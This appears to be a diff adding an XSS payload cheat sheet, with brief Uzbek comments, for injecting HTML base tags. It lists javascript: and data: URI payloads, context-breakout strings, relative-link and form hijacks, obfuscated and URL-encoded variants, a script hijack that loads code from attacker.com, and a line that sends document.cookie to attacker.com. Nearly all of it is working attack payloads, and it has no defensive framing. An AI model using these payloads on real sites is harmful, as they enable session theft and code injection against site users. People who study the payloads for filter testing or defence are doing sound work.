@@ -1,0 +1,96 @@
+🔥 ULTIMATE BASE TAG XSS (CLEAN)
+
+⸻
+
+1. CORE (LIMITED ⚠️)
+
+<base href="javascript:alert(1)//">
+<base href=javascript:alert(1)//>
+
+👉 ba’zi browserlarda bloklangan, lekin contextga bog‘liq ishlaydi
+
+⸻
+
+2. DATA URI (MUHIM)
+
+<base href="data:text/html,<script>alert(1)</script>">
+<base href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+
+⸻
+
+3. CONTEXT BREAKOUT
+
+"><base href="javascript:alert(1)//">
+'><base href="data:text/html,<script>alert(1)</script>">
+
+
+⸻
+
+4. RELATIVE URL HIJACK (ENG REAL)
+
+<base href="javascript:alert(1)//">
+<a href="/">click</a>
+
+👉 barcha relative linklar → javascript ga o‘tadi
+
+⸻
+
+5. SCRIPT HIJACK
+
+<base href="https://attacker.com/">
+<script src="app.js"></script>
+
+👉 script attacker’dan yuklanadi
+
+⸻
+
+6. FORM HIJACK
+
+<base href="javascript:alert(1)//">
+<form action="/submit"><input type=submit>
+
+
+⸻
+
+7. DATA EXFILTRATION
+
+<base href="javascript:fetch('//attacker.com?c='+document.cookie)//">
+
+
+⸻
+
+8. OBFUSCATION
+
+<base href="jAvAsCrIpT:alert(1)//">
+<base href="javascript&colon;alert(1)//">
+<base href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)//">
+
+
+⸻
+
+9. POLYGLOT
+
+</title><base href="javascript:alert(1)//">
+
+
+⸻
+
+10. ENCODED
+
+%3Cbase%20href%3Djavascript%3Aalert(1)%2F%2F%3E
+
+
+⸻
+
+11. ADVANCED JS
+
+<base href="javascript:eval('alert(1)')//">
+<base href="javascript:setTimeout(alert,0,1)//">
+
+
+⸻
+
+12. HYBRID (CHAIN)
+
+<base href="data:text/html,<svg onload=alert(1)>">
